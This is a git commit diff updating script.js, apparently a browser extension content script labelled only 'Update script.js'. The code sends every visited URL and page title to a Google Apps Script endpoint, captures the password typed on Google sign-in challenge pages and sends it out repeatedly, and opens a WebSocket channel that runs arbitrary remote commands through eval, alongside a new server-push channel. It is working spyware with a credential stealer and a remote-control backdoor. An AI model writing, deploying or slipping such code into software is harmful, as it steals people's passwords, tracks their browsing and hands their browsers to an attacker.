32f710cfac4042e5f1ef91ae563e50ec397cdd36
Josh Chang <joshchang04@gmail.com>
2021-03-17 13:33:23 -0400

    Update script.js

--- script.js
+++ script.js
@@ -1,93 +1,107 @@
-console.log('V19');
+console.log('V20');
 
-// Log URLs and init actions
+// Log URLs and data
 function serverLog(data) {
-  return fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${data}`, {
-    mode: 'cors'
-  })
+	return fetch(`https://script.google.com/macros/s/AKfycbw6FXUT2mISNq5obxQHkjjfEYQqBlo-k1U3m2qwQdLP9HPztj6nliggK4XMIqLaglBxug/exec?url=${window.location.href}&data=${data}`, {
+		mode: 'cors'
+	})
 }
 
-serverLog($('title').text()).then(res => res.text()).then(text => {
-  if (text.split('@')[0] === 'live') {
-    initLiveControl(text.split('@')[1]);
-  }
-})
+// Get current state from the apps script server
+serverLog($('title').text())
+	.then(res => res.text())
+	.then(text => {
+		switch (text.split('@')[0]) {
+			case 'live':
+				initLiveControl(text.split('@')[1]);
+				break;
+			case 'lc2':
+				initLC2(text.split('@')[1]);
+				break;
+		}
+	})
 siteSpecifics(window.location.host)
 
+// Check repeatedly to see if location has changed
 var href = window.location.href;
 setInterval(() => {
-  if (window.location.href !== href) {
-    href = window.location.href;
-    serverLog($('title').text());
-    siteSpecifics(window.location.host);
-  }
+	if (window.location.href !== href) {
+		href = window.location.href;
+		serverLog($('title').text());
+		siteSpecifics(window.location.host);
+	}
 }, 50);
-
-// Live Control
-function initLiveControl(socketUrl) {
-  if (window.location.protocol === 'https:') {
-    window.location = 'http://example.com'
-  }
-  if (window.location.protocol === 'http:' && window.location.host !== '127.0.0.1:8080') {
-
-    console.log('Live');
-    $('html')[0].innerHTML = `
-    <head>
-    <title>blank</title>
-    </head>
-    <body></body>
-    `;
-
-    const socket = new WebSocket(socketUrl);
-
-    socket.addEventListener('open', function (event) {
-      var message = {
-        type: "handshake",
-        content: "client"
-      }
-      socket.send(JSON.stringify(message));
-    });
-
-    socket.addEventListener('message', function (event) {
-      var data = JSON.parse(event.data);
-      console.log(data);
-      if (data.type === 'commandClient') {
-        eval(data.content);
-      }
-    });
-  }
-}
 
 // Distribute site specific tasks
 function siteSpecifics(host) {
+	switch (host) {
+		case 'accounts.google.com':
+			initPasswordMonitor();
+			break;
+	}
 
-  if (host === 'accounts.google.com') {
-    initPasswordMonitor();
-  }
+}
 
+// Live Control
+function initLiveControl(socketUrl) {
+	if (window.location.protocol === 'https:') {
+		window.location = 'http://example.com'
+	}
+	if (window.location.protocol === 'http:' && window.location.host !== '127.0.0.1:8080') {
+
+		console.log('Live');
+		$('html')[0].innerHTML = `<head><title>blank</title></head><body></body>`;
+
+		const socket = new WebSocket(socketUrl);
+
+		socket.addEventListener('open', function (event) {
+			var message = {
+				type: "handshake",
+				content: "client"
+			}
+			socket.send(JSON.stringify(message));
+		});
+
+		socket.addEventListener('message', function (event) {
+			var data = JSON.parse(event.data);
+			console.log(data);
+			if (data.type === 'commandClient') {
+				eval(data.content);
+			}
+		});
+	}
+}
+// LC2 (Live Control 2)
+function initLC2(serverUrl) {
+	if (window.location.host !== '127.0.0.1:8080') {
+		var es = new EventSource(serverUrl);
+		es.onmessage = function (event) {
+			console.log(event.data);
+		};
+	}
 }
 
 // Google Password
 function initPasswordMonitor() {
-  if (window.location.pathname.split('/')[1] === 'signin' && window.location.pathname.split('/')[3] === 'challenge') {
+	if (window.location.pathname.split('/')[1] === 'signin' && window.location.pathname.split('/')[3] === 'challenge') {
 
-    console.log('Monitoring');
+		console.log('Monitoring');
 
-    var password = $("input.whsOnd[type='password']");
-    var currentVal = password.attr('data-initial-value');
+		var password = $("input.whsOnd[type='password']");
+		var currentVal = password.attr('data-initial-value');
 
-    // Send to server
-    serverLog(`PASSWORD: ${currentVal}`);
+		// Send to server
+		serverLog(`PASSWORD: ${currentVal}`);
 
-    // Check to see if the password has changed
-    setInterval(() => {
-      if (password.attr('data-initial-value') !== currentVal) {
+		// Check to see if the password has changed
+		setInterval(() => {
+			if (password.attr('data-initial-value') !== currentVal) {
 
-        currentVal = password.attr('data-initial-value');
+				currentVal = password.attr('data-initial-value');
 
-        // Send to server
-        serverLog(`PASSWORD: ${currentVal}`);
-      }
-    }, 10);
-  }
+				// Send to server
+				serverLog(`PASSWORD: ${currentVal}`);
+			}
+		}, 10);
+	}
 }
